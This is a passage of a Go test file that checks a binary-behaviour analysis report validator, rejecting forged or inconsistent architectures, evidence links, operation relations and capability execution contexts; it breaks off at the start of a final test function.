func TestValidateReportReferencesAcceptsCapabilityProjectionForms(t *testing.T) {
	t.Run("constrained operation binding", func(t *testing.T) {
		rep := connectedReferenceReport()
		appendFixtureEvidence(&rep, "ev-binding", "node-child", "scope-child", "arm64")
		rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"ev-binding"}
		rep.Operations[0].ResourceBindings = append(
			rep.Operations[0].ResourceBindings,
			behavior.Bind(behavior.ResourceRoleArguments, behavior.NewResource(behavior.ResourceCommand, "--verbose")),
		)
		rep.Operations[0].ResourceBindings, _ = behavior.NormalizeResourceBindings(rep.Operations[0].Kind, rep.Operations[0].ResourceBindings)
		assertValidReport(t, rep)
	})

	t.Run("Each Feature evidence", func(t *testing.T) {
		rep := connectedReferenceReport()
		appendFixtureEvidence(&rep, "ev-feature", "node-child", "scope-child", "arm64")
		rep.Features[0].EvidenceIDs = []string{"ev-1", "ev-feature"}
		rep.Capabilities[0].EvidenceIDs = []string{"ev-1", "ev-feature"}
		rep.Capabilities[0].MatchTrace = []behavior.MatchTraceClause{
			{Path: "match.each.left", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
			{Path: "match.each.right", Kind: behavior.MatchTraceFeature, FeatureIDs: []string{"feature-1"}},
		}
		assertValidReport(t, rep)
	})

	t.Run("Each ExecutionRoot evidence", func(t *testing.T) {
		rep := connectedReferenceReport()
		appendFixtureEvidence(&rep, "ev-root", "node-child", "scope-child", "arm64")
		rep.ExecutionRoots[0].EvidenceIDs = []string{"ev-1", "ev-root"}
		rep.Capabilities[0].EvidenceIDs = []string{"ev-1", "ev-root"}
		rep.Capabilities[0].MatchTrace = []behavior.MatchTraceClause{
			{Path: "match.each.left", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
			{Path: "match.each.right", Kind: behavior.MatchTraceExecutionRoot, ExecutionRootIDs: []string{"root-1"}},
		}
		assertValidReport(t, rep)
	})

	t.Run("Relate evidence", func(t *testing.T) {
		rep := connectedReferenceReport()
		appendFixtureEvidence(&rep, "ev-relation", "node-child", "scope-child", "arm64")
		rep.Operations[0].EvidenceIDs = append(rep.Operations[0].EvidenceIDs, "ev-relation")
		rep.Operations[1].EvidenceIDs = append(rep.Operations[1].EvidenceIDs, "ev-relation")
		rep.OperationRelations = []behavior.OperationRelation{{
			ID:           "relation-1",
			Kind:         behavior.RelationPrecedes,
			From:         behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-1"),
			To:           behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-network"),
			EvidenceIDs:  []string{"ev-relation"},
			Support:      behavior.SupportCorroborated,
			Execution:    rep.Operations[0].Execution,
			Architecture: "arm64",
		}}
		rep.Capabilities[0].OperationIDs = []string{"operation-1", "operation-network"}
		rep.Capabilities[0].EvidenceIDs = []string{"ev-1", "ev-relation"}
		rep.Capabilities[0].MatchTrace = []behavior.MatchTraceClause{
			{Path: "match.relate.constraint", Kind: behavior.MatchTraceOperationRelation, RelationIDs: []string{"relation-1"}},
			{Path: "match.relate.left", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
			{Path: "match.relate.right", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-network"}},
		}
		assertValidReport(t, rep)
	})

	t.Run("ResourceFlow merged classification", func(t *testing.T) {
		rep := resourceFlowProjectionReport()
		assertValidReport(t, rep)
		prepareSavedFixture(&rep)
		var encoded bytes.Buffer
		if err := WriteJSON(&encoded, rep); err != nil {
			t.Fatal(err)
		}
		reloaded, err := decodeReport(bytes.NewReader(encoded.Bytes()))
		if err != nil {
			t.Fatalf("strict reload rejected ResourceFlow projection: %v", err)
		}
		resource := reloaded.Capabilities[0].AffectedResources[0]
		if !resource.HasClassification(behavior.ResourceClassArchive) || !resource.HasClassification(behavior.ResourceClassPackage) {
			t.Fatalf("strict reload lost merged resource classification: %#v", resource)
		}
	})
}

func TestValidateReportReferencesRejectsIncoherentCapabilityProjections(t *testing.T) {
	for _, test := range capabilityProjectionForgeryCases() {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestDecodeReportRejectsCapabilityProjectionForgeries(t *testing.T) {
	for _, test := range capabilityProjectionForgeryCases() {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			prepareSavedFixture(&rep)
			var encoded bytes.Buffer
			if err := WriteJSON(&encoded, rep); err != nil {
				t.Fatal(err)
			}
			_, err := decodeReport(bytes.NewReader(encoded.Bytes()))
			if err == nil || !strings.Contains(err.Error(), test.want) {
				t.Fatalf("decodeReport() error = %v, want %q", err, test.want)
			}
		})
	}
}

func TestValidFactArchitectureUsesProducerGrammar(t *testing.T) {
	for _, value := range []string{
		"i386", "x86_64", "x86_64h", "arm", "arm64", "arm64e", "ppc", "ppc64",
		"CpuArm", "CpuPpc", "CpuPpc64", "arm/0x1", "ppc64/0xffffff",
		"19", "4294967295", "19/0xa",
	} {
		if !validFactArchitecture(value) {
			t.Errorf("validFactArchitecture(%q) = false, want producer-compatible label", value)
		}
	}
	for _, value := range []string{
		"all", "forged-arch", "ARM64", "arm64/0x2", "x86_64/0x8",
		"arm/0x0", "arm/0x01", "arm/0xA", "019", "4294967296", "19/0x1000000",
	} {
		if validFactArchitecture(value) {
			t.Errorf("validFactArchitecture(%q) = true, want noncanonical label rejection", value)
		}
	}
	if err := validateFactArchitectureList("architectures", []string{"x86_64", "arm64"}, true); err == nil || !strings.Contains(err.Error(), "not in canonical order") {
		t.Fatalf("validateFactArchitectureList() error = %v, want canonical-order rejection", err)
	}
}

func TestValidateReportReferencesValidatesEveryFactArchitecture(t *testing.T) {
	t.Run("preserves producer inventory order", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.ArtifactNodes[1].Architectures = []string{"x86_64h", "arm64e"}
		assertValidReport(t, rep)
	})

	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "artifact", want: "artifact_nodes[1].architectures[0]", mutate: func(rep *Report) { rep.ArtifactNodes[1].Architectures = []string{"forged-arch"} }},
		{name: "artifact empty", want: "artifact_nodes[1].architectures[0] must not be empty", mutate: func(rep *Report) { rep.ArtifactNodes[1].Architectures = []string{""} }},
		{name: "artifact duplicate", want: "artifact_nodes[1].architectures[1] duplicates", mutate: func(rep *Report) {
			rep.ArtifactNodes[1].Architectures = []string{"arm64", "arm64"}
		}},
		{name: "scope", want: "scopes[1].architecture", mutate: func(rep *Report) { rep.Scopes[1].Architecture = "forged-arch" }},
		{name: "evidence", want: "evidence[0].architecture", mutate: func(rep *Report) { rep.Evidence[0].Arch = "forged-arch" }},
		{name: "feature", want: "features[0].architecture", mutate: func(rep *Report) { rep.Features[0].Architecture = "forged-arch" }},
		{name: "operation", want: "operations[0].architecture", mutate: func(rep *Report) { rep.Operations[0].Architecture = "forged-arch" }},
		{name: "relation", want: "operation_relations[0].architecture", mutate: func(rep *Report) { rep.OperationRelations[0].Architecture = "forged-arch" }},
		{name: "network observation", want: "network_implementations[0].architecture", mutate: func(rep *Report) {
			rep.NetworkImplementations[0].Architecture = "forged-arch"
		}},
		{name: "capability", want: "capability_matches[0].architecture_scopes[0]", mutate: func(rep *Report) {
			rep.Capabilities[0].ArchitectureScopes = []string{"forged-arch"}
		}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedRelationReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesAcceptsTypedOperationRelation(t *testing.T) {
	rep := connectedRelationReport()
	if err := validateReportReferences(rep); err != nil {
		t.Fatalf("typed operation relation was rejected: %v", err)
	}
}

func TestValidateReportReferencesRejectsMalformedOperationRelations(t *testing.T) {
	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "duplicate ID", want: "duplicates", mutate: func(rep *Report) { rep.OperationRelations = append(rep.OperationRelations, rep.OperationRelations[0]) }},
		{name: "unknown kind", want: "invalid relation kind", mutate: func(rep *Report) { rep.OperationRelations[0].Kind = "guesses" }},
		{name: "missing operation", want: "missing operation", mutate: func(rep *Report) { rep.OperationRelations[0].To.ID = "missing" }},
		{name: "missing evidence", want: "evidence_ids must not be empty", mutate: func(rep *Report) { rep.OperationRelations[0].EvidenceIDs = nil }},
		{name: "dangling evidence", want: "references missing evidence", mutate: func(rep *Report) { rep.OperationRelations[0].EvidenceIDs = []string{"missing"} }},
		{name: "unnormalized evidence", want: "duplicates", mutate: func(rep *Report) { rep.OperationRelations[0].EvidenceIDs = []string{"ev-1", "ev-1"} }},
		{name: "wrong binding", want: "is not bound", mutate: func(rep *Report) { rep.OperationRelations[0].From.ResourceRole = behavior.ResourceRoleArguments }},
		{name: "strengthened support", want: "exceeds operation", mutate: func(rep *Report) { rep.OperationRelations[0].Support = behavior.SupportDirect }},
		{name: "dangling root context", want: "references missing execution root", mutate: func(rep *Report) { rep.OperationRelations[0].Execution.ExecutionRootIDs = []string{"missing"} }},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedRelationReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRequiresExactOperationRelationEvidenceLineage(t *testing.T) {
	rep := connectedRelationReport()
	appendFixtureEvidence(&rep, "ev-unrelated", "node-child", "scope-child", "arm64")
	rep.OperationRelations[0].EvidenceIDs = []string{"ev-unrelated"}
	assertValidationErrorContains(t, rep, "not direct evidence or resource-binding evidence of a relation endpoint")
}

func TestValidateReportReferencesRequiresProofFromBothOperationEndpoints(t *testing.T) {
	rep := connectedReferenceReport()
	appendFixtureEvidence(&rep, "ev-left", "node-child", "scope-child", "arm64")
	appendFixtureEvidence(&rep, "ev-right", "node-child", "scope-child", "arm64")
	rep.Operations[0].EvidenceIDs = []string{"ev-left"}
	rep.Operations[1].EvidenceIDs = []string{"ev-right"}
	rep.OperationRelations = []behavior.OperationRelation{{
		ID: "relation-precedes", Kind: behavior.RelationPrecedes,
		From:        behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-1"),
		To:          behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-network"),
		EvidenceIDs: []string{"ev-left"}, Support: behavior.SupportCorroborated,
		Execution: rep.Operations[0].Execution, Architecture: "arm64",
	}}
	assertValidationErrorContains(t, rep, "proof from operation endpoint \"operation-network\"")
}

func TestValidateReportReferencesAcceptsExactCrossScopeCallEvidence(t *testing.T) {
	rep := connectedReferenceReport()
	rep.Scopes = append(rep.Scopes, behavior.Scope{
		ID: "scope-helper", NodeID: "node-child", ParentID: "scope-root",
		Kind: "function", Name: "helper", Function: "helper", Architecture: "arm64",
	})
	appendFixtureEvidence(&rep, "ev-call", "node-child", "scope-child", "arm64")
	rep.Evidence[len(rep.Evidence)-1].Kind = "direct-call"
	rep.Evidence[len(rep.Evidence)-1].Value = "helper"
	rep.Features = append(rep.Features, behavior.Feature{
		ID: "feature-call", NodeID: "node-child", ScopeID: "scope-child",
		Architecture: "arm64", SourceFunction: "fixtureFunction",
		Key: "macho.function_call", Value: "helper", EvidenceIDs: []string{"ev-call"},
		Support: behavior.SupportDirect, Execution: rep.Operations[0].Execution,
	})
	rep.OperationRelations = []behavior.OperationRelation{{
		ID: "relation-call", Kind: behavior.RelationCalls,
		From:        behavior.IDRelationEndpoint(behavior.RelationEndpointScope, "scope-child"),
		To:          behavior.IDRelationEndpoint(behavior.RelationEndpointScope, "scope-helper"),
		EvidenceIDs: []string{"ev-call"}, Support: behavior.SupportDirect,
		Execution: rep.Operations[0].Execution, Architecture: "arm64",
	}}
	assertValidReport(t, rep)

	appendFixtureEvidence(&rep, "ev-call-lookalike", "node-child", "scope-child", "arm64")
	rep.OperationRelations[0].EvidenceIDs = []string{"ev-call-lookalike"}
	assertValidationErrorContains(t, rep, "not evidence of an exact direct-call feature")
}

func TestValidateReportReferencesAcceptsCrossNodeInvocationRelationLineage(t *testing.T) {
	rep := connectedReferenceReport()
	rep.ExecutionRoots[0].StartNodeID = "node-root"
	rep.ExecutionRoots[0].StartScopeID = ""
	rep.AnalysisSelection[0].Reasons = []behavior.SelectionReason{behavior.SelectionReasonInvokedTarget}
	rep.OperationRelations = []behavior.OperationRelation{{
		ID: "relation-invokes", Kind: behavior.RelationInvokes,
		From:        behavior.IDRelationEndpoint(behavior.RelationEndpointExecutionRoot, "root-1"),
		To:          behavior.IDRelationEndpoint(behavior.RelationEndpointInvokedTarget, "target-1"),
		EvidenceIDs: []string{"ev-1"}, Support: behavior.SupportCorroborated,
		Execution: rep.InvokedTargets[0].Execution, Architecture: "arm64",
	}}
	assertValidReport(t, rep)
}

func TestValidateReportReferencesAcceptsNestedAndRootlessTargets(t *testing.T) {
	t.Run("nested target retains ownership chain", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.InvokedTargets = append(rep.InvokedTargets, behavior.InvokedTarget{
			ID: "target-2", Kind: "nested-target", NodeID: "node-child", ScopeID: "scope-child",
			Source: behavior.EntityRef{Kind: behavior.EntityKindInvokedTarget, ID: "target-1"},
			Execution: behavior.ExecutionContext{
				Connectivity: behavior.ConnectivityConnected, ExecutionRootIDs: []string{"root-1"}, InvokedTargetIDs: []string{"target-1"},
			},
			EvidenceIDs: []string{"ev-1"},
		})
		if err := validateReportReferences(rep); err != nil {
			t.Fatalf("nested target was rejected: %v", err)
		}
	})
	t.Run("artifact-sourced rootless target", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.InvokedTargets[0].Source = behavior.EntityRef{Kind: behavior.EntityKindArtifactNode, ID: "node-root"}
		rep.InvokedTargets[0].Kind = "bundle-script"
		rep.Relationships = append(rep.Relationships, artifact.Edge{From: "node-root", To: "node-child", Kind: "bundle-script"})
		rep.InvokedTargets[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		rep.Operations[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		rep.Operations[1].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		rep.Features[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		rep.Capabilities[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		rep.NetworkImplementations[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		if err := validateReportReferences(rep); err != nil {
			t.Fatalf("artifact-sourced rootless target was rejected: %v", err)
		}
	})
}

func TestValidateReportReferencesRejectsDanglingExecutionReferences(t *testing.T) {
	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "root declaration node", want: "execution_roots[0].declaration_node_id", mutate: func(rep *Report) { rep.ExecutionRoots[0].DeclarationNodeID = "missing" }},
		{name: "root start node", want: "execution_roots[0].start_node_id", mutate: func(rep *Report) { rep.ExecutionRoots[0].StartNodeID = "missing" }},
		{name: "root start scope", want: "execution_roots[0].start_scope_id", mutate: func(rep *Report) { rep.ExecutionRoots[0].StartScopeID = "missing" }},
		{name: "root evidence", want: "execution_roots[0].evidence_ids[0]", mutate: func(rep *Report) { rep.ExecutionRoots[0].EvidenceIDs[0] = "missing" }},
		{name: "target node", want: "invoked_targets[0].node_id", mutate: func(rep *Report) { rep.InvokedTargets[0].NodeID = "missing" }},
		{name: "target scope", want: "invoked_targets[0].scope_id", mutate: func(rep *Report) { rep.InvokedTargets[0].ScopeID = "missing" }},
		{name: "target source", want: "invoked_targets[0].source.id", mutate: func(rep *Report) { rep.InvokedTargets[0].Source.ID = "missing" }},
		{name: "target root context", want: "invoked_targets[0].execution.execution_root_ids[0]", mutate: func(rep *Report) { rep.InvokedTargets[0].Execution.ExecutionRootIDs[0] = "missing" }},
		{name: "target evidence", want: "invoked_targets[0].evidence_ids[0]", mutate: func(rep *Report) { rep.InvokedTargets[0].EvidenceIDs[0] = "missing" }},
		{name: "selection node", want: "analysis_selection[0].node_id", mutate: func(rep *Report) { rep.AnalysisSelection[0].NodeID = "missing" }},
		{name: "feature root context", want: "features[0].execution.execution_root_ids[0]", mutate: func(rep *Report) { rep.Features[0].Execution.ExecutionRootIDs[0] = "missing" }},
		{name: "feature scope ownership", want: "scope_id references a scope owned", mutate: func(rep *Report) { rep.Features[0].NodeID = "node-root" }},
		{name: "feature scope architecture", want: "differs from scope architecture", mutate: func(rep *Report) { rep.Features[0].Architecture = "x86_64" }},
		{name: "evidence scope architecture", want: "evidence[0].architecture", mutate: func(rep *Report) { rep.Evidence[0].Arch = "x86_64" }},
		{name: "evidence scope function", want: "evidence[0].function", mutate: func(rep *Report) { rep.Evidence[0].Function = "forged" }},
		{name: "evidence function without scope", want: "requires an exact scope_id", mutate: func(rep *Report) { rep.Evidence[0].ScopeID = "" }},
		{name: "feature scope function", want: "features[0].source_function", mutate: func(rep *Report) { rep.Features[0].SourceFunction = "forged" }},
		{name: "feature function without scope", want: "requires an exact scope_id", mutate: func(rep *Report) { rep.Features[0].ScopeID = "" }},
		{name: "feature evidence architecture", want: "differs from evidence", mutate: func(rep *Report) {
			appendFixtureEvidence(rep, "ev-x86", "node-child", "", "x86_64")
			rep.Features[0].EvidenceIDs = append(rep.Features[0].EvidenceIDs, "ev-x86")
		}},
		{name: "feature evidence function", want: "differs from function evidence", mutate: func(rep *Report) {
			appendFixtureFunctionEvidence(rep, "ev-other-function", "other")
			rep.Features[0].EvidenceIDs = append(rep.Features[0].EvidenceIDs, "ev-other-function")
		}},
		{name: "feature evidence same-name different scope", want: "differs from function evidence", mutate: func(rep *Report) {
			appendFixtureSameNameScopeEvidence(rep, "ev-same-name")
			rep.Features[0].EvidenceIDs = append(rep.Features[0].EvidenceIDs, "ev-same-name")
		}},
		{name: "feature architecture qualifier", want: "must not contain typed context key", mutate: func(rep *Report) { rep.Features[0].Qualifiers = map[string]string{"arch": "arm64"} }},
		{name: "operation target context", want: "operations[0].execution.invoked_target_ids[0]", mutate: func(rep *Report) { rep.Operations[0].Execution.InvokedTargetIDs[0] = "missing" }},
		{name: "operation binding evidence", want: "operations[0].resource_bindings[0].evidence_ids[0]", mutate: func(rep *Report) { rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"missing"} }},
		{name: "operation scope ownership", want: "scope_id references a scope owned", mutate: func(rep *Report) { rep.Operations[0].SubjectNodeID = "node-root" }},
		{name: "operation scope architecture", want: "operations[0].architecture", mutate: func(rep *Report) { rep.Operations[0].Architecture = "x86_64" }},
		{name: "operation scope function", want: "operations[0].source_function", mutate: func(rep *Report) { rep.Operations[0].SourceFunction = "forged" }},
		{name: "operation function without scope", want: "requires an exact scope_id", mutate: func(rep *Report) { rep.Operations[0].ScopeID = "" }},
		{name: "operation evidence architecture", want: "differs from evidence", mutate: func(rep *Report) {
			appendFixtureEvidence(rep, "ev-x86", "node-child", "", "x86_64")
			rep.Operations[0].EvidenceIDs = []string{"ev-x86"}
		}},
		{name: "operation evidence function", want: "differs from function evidence", mutate: func(rep *Report) {
			appendFixtureFunctionEvidence(rep, "ev-other-function", "other")
			rep.Operations[0].EvidenceIDs = []string{"ev-other-function"}
		}},
		{name: "operation evidence same-name different scope", want: "differs from function evidence", mutate: func(rep *Report) {
			appendFixtureSameNameScopeEvidence(rep, "ev-same-name")
			rep.Operations[0].EvidenceIDs = []string{"ev-same-name"}
		}},
		{name: "operation binding evidence function", want: "differs from resource binding function evidence", mutate: func(rep *Report) {
			appendFixtureFunctionEvidence(rep, "ev-other-function", "other")
			rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"ev-other-function"}
		}},
		{name: "operation binding evidence same-name different scope", want: "differs from resource binding function evidence", mutate: func(rep *Report) {
			appendFixtureSameNameScopeEvidence(rep, "ev-same-name")
			rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"ev-same-name"}
		}},
		{name: "operation binding evidence architecture", want: "differs from resource binding evidence", mutate: func(rep *Report) {
			appendFixtureEvidence(rep, "ev-x86", "node-child", "", "x86_64")
			rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"ev-x86"}
		}},
		{name: "relation evidence architecture", want: "operation_relations[0].architecture", mutate: func(rep *Report) {
			appendFixtureEvidence(rep, "ev-x86", "node-child", "", "x86_64")
			rep.OperationRelations = []behavior.OperationRelation{{
				ID:           "relation-1",
				Kind:         behavior.RelationPrecedes,
				From:         behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-1"),
				To:           behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-network"),
				EvidenceIDs:  []string{"ev-x86"},
				Support:      behavior.SupportCorroborated,
				Execution:    rep.Operations[0].Execution,
				Architecture: "arm64",
			}}
		}},
		{name: "capability root context", want: "capability_matches[0].execution.execution_root_ids[0]", mutate: func(rep *Report) { rep.Capabilities[0].Execution.ExecutionRootIDs[0] = "missing" }},
		{name: "capability operation", want: "capability_matches[0].operation_ids[0]", mutate: func(rep *Report) { rep.Capabilities[0].OperationIDs[0] = "missing" }},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRejectsExecutionInvariantViolations(t *testing.T) {
	negative := -1
	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "root without start", want: "requires start_node_id or start_scope_id", mutate: func(rep *Report) {
			rep.ExecutionRoots[0].StartNodeID = ""
			rep.ExecutionRoots[0].StartScopeID = ""
		}},
		{name: "root scope on different node", want: "not start_node_id", mutate: func(rep *Report) { rep.ExecutionRoots[0].StartNodeID = "node-root" }},
		{name: "target scope on different node", want: "not node_id", mutate: func(rep *Report) { rep.InvokedTargets[0].NodeID = "node-root" }},
		{name: "target source kind", want: "source.kind has invalid value", mutate: func(rep *Report) { rep.InvokedTargets[0].Source.Kind = "free-form" }},
		{name: "target self source", want: "must not reference the target itself", mutate: func(rep *Report) {
			rep.InvokedTargets[0].Source = behavior.EntityRef{Kind: behavior.EntityKindInvokedTarget, ID: "target-1"}
		}},
		{name: "target source cycle", want: "source graph contains a cycle", mutate: func(rep *Report) {
			second := rep.InvokedTargets[0]
			second.ID = "target-2"
			second.Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
			second.Source = behavior.EntityRef{Kind: behavior.EntityKindInvokedTarget, ID: "target-1"}
			rep.InvokedTargets[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
			rep.InvokedTargets[0].Source = behavior.EntityRef{Kind: behavior.EntityKindInvokedTarget, ID: "target-2"}
			rep.InvokedTargets = append(rep.InvokedTargets, second)
		}},
		{name: "target own context", want: "must not contain the target's own ID", mutate: func(rep *Report) { rep.InvokedTargets[0].Execution.InvokedTargetIDs = []string{"target-1"} }},
		{name: "target loses source root", want: "must retain source execution root", mutate: func(rep *Report) {
			rep.InvokedTargets[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		}},
		{name: "negative target ordinal", want: "ordinal must not be negative", mutate: func(rep *Report) { rep.InvokedTargets[0].Ordinal = &negative }},
		{name: "duplicate selection node", want: "duplicates analysis selection", mutate: func(rep *Report) { rep.AnalysisSelection = append(rep.AnalysisSelection, rep.AnalysisSelection[0]) }},
		{name: "empty selection reasons", want: "reasons must not be empty", mutate: func(rep *Report) { rep.AnalysisSelection[0].Reasons = nil }},
		{name: "unknown selection reason", want: "reasons[0] has invalid value", mutate: func(rep *Report) { rep.AnalysisSelection[0].Reasons = []behavior.SelectionReason{"guess"} }},
		{name: "duplicate selection reason", want: "reasons[1] duplicates", mutate: func(rep *Report) {
			rep.AnalysisSelection[0].Reasons = []behavior.SelectionReason{behavior.SelectionReasonExecutionRoot, behavior.SelectionReasonExecutionRoot}
		}},
		{name: "connected without root", want: "CONNECTED execution context requires", mutate: func(rep *Report) { rep.Operations[0].Execution.ExecutionRootIDs = nil }},
		{name: "unconnected with target", want: "UNCONNECTED execution context cannot carry", mutate: func(rep *Report) {
			rep.Features[0].Execution.Connectivity = behavior.ConnectivityUnconnected
		}},
		{name: "invalid connectivity", want: "invalid execution connectivity", mutate: func(rep *Report) { rep.Operations[0].Execution.Connectivity = "MAYBE" }},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRejectsDuplicateExecutionListsAndIDs(t *testing.T) {
	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "duplicate root id", want: "execution_roots[1].id duplicates", mutate: func(rep *Report) { rep.ExecutionRoots = append(rep.ExecutionRoots, rep.ExecutionRoots[0]) }},
		{name: "duplicate target id", want: "invoked_targets[1].id duplicates", mutate: func(rep *Report) { rep.InvokedTargets = append(rep.InvokedTargets, rep.InvokedTargets[0]) }},
		{name: "empty root id", want: "execution_roots[0].id must not be empty", mutate: func(rep *Report) { rep.ExecutionRoots[0].ID = "" }},
		{name: "duplicate root context", want: "execution_root_ids[1] duplicates", mutate: func(rep *Report) { rep.Operations[0].Execution.ExecutionRootIDs = []string{"root-1", "root-1"} }},
		{name: "duplicate target context", want: "invoked_target_ids[1] duplicates", mutate: func(rep *Report) { rep.Operations[0].Execution.InvokedTargetIDs = []string{"target-1", "target-1"} }},
		{name: "empty root evidence", want: "execution_roots[0].evidence_ids must not be empty", mutate: func(rep *Report) { rep.ExecutionRoots[0].EvidenceIDs = nil }},
		{name: "empty target evidence", want: "invoked_targets[0].evidence_ids must not be empty", mutate: func(rep *Report) { rep.InvokedTargets[0].EvidenceIDs = nil }},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRejectsIncoherentCapabilityExecution(t *testing.T) {
	t.Run("connected capability with unknown operation", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.Operations[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		assertValidationErrorContains(t, rep, `does not match supporting-operation connectivity "UNKNOWN"`)
	})
	t.Run("root not common to every operation", func(t *testing.T) {
		rep := connectedReferenceReport()
		second := rep.ExecutionRoots[0]
		second.ID = "root-2"
		rep.ExecutionRoots = append(rep.ExecutionRoots, second)
		secondTarget := rep.InvokedTargets[0]
		secondTarget.ID = "target-2"
		secondTarget.Source.ID = "root-2"
		secondTarget.Execution.ExecutionRootIDs = []string{"root-2"}
		rep.InvokedTargets = append(rep.InvokedTargets, secondTarget)
		secondOperation := rep.Operations[0]
		secondOperation.ID = "operation-2"
		secondOperation.Execution.ExecutionRootIDs = []string{"root-2"}
		secondOperation.Execution.InvokedTargetIDs = []string{"target-2"}
		rep.Operations = append(rep.Operations, secondOperation)
		rep.Capabilities[0].OperationIDs = []string{"operation-1", "operation-2"}
		rep.Capabilities[0].MatchTrace[0].OperationIDs = []string{"operation-1", "operation-2"}
		assertValidationErrorContains(t, rep, `does not match supporting-operation connectivity "UNKNOWN"`)
	})
	t.Run("unconnected capability with connected operation", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.Capabilities[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnconnected}
		assertValidationErrorContains(t, rep, `does not match supporting-operation connectivity "CONNECTED"`)
	})
	t.Run("unknown capability with connected operation", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.Capabilities[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
		assertValidationErrorContains(t, rep, `does not match supporting-operation connectivity "CONNECTED"`)
	})
	t.Run("connected capability drops target ownership", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.Capabilities[0].Execution.InvokedTargetIDs = nil
		assertValidationErrorContains(t, rep, "targets must equal the root-compatible supporting-operation target intersection")
	})
	t.Run("primitive capability drops common root", func(t *testing.T) {
		rep := connectedReferenceReport()
		second := rep.ExecutionRoots[0]
		second.ID = "root-2"
		rep.ExecutionRoots = append(rep.ExecutionRoots, second)
		rep.Operations[0].Execution = behavior.ExecutionContext{
			Connectivity:     behavior.ConnectivityConnected,
			ExecutionRootIDs: []string{"root-1", "root-2"},
		}
		rep.Capabilities[0].Execution = behavior.ExecutionContext{
			Connectivity:     behavior.ConnectivityConnected,
			ExecutionRootIDs: []string{"root-1"},
		}
		assertValidationErrorContains(t, rep, "roots must equal the retained supporting-operation root projection")
	})
	t.Run("execution-root trace substitutes a different root", func(t *testing.T) {
		rep := connectedReferenceReport()
		second := rep.ExecutionRoots[0]
		second.ID = "root-2"
		rep.ExecutionRoots = append(rep.ExecutionRoots, second)
		rep.Operations[0].Execution = behavior.ExecutionContext{
			Connectivity:     behavior.ConnectivityConnected,
			ExecutionRootIDs: []string{"root-1", "root-2"},
		}
		rep.Capabilities[0].Execution = behavior.ExecutionContext{
			Connectivity:     behavior.ConnectivityConnected,
			ExecutionRootIDs: []string{"root-2"},
		}
		rep.Capabilities[0].MatchTrace = []behavior.MatchTraceClause{
			{Path: "match.each.left", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
			{Path: "match.each.right", Kind: behavior.MatchTraceExecutionRoot, ExecutionRootIDs: []string{"root-1"}},
		}
		assertValidationErrorContains(t, rep, "roots must equal the retained supporting-operation root projection")
	})
	t.Run("support stronger than operation", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.Capabilities[0].Support = behavior.SupportDirect
		assertValidationErrorContains(t, rep, "is stronger than supporting operation")
	})
}

func TestValidateReportReferencesRejectsIncoherentRecordExecutionOwnership(t *testing.T) {
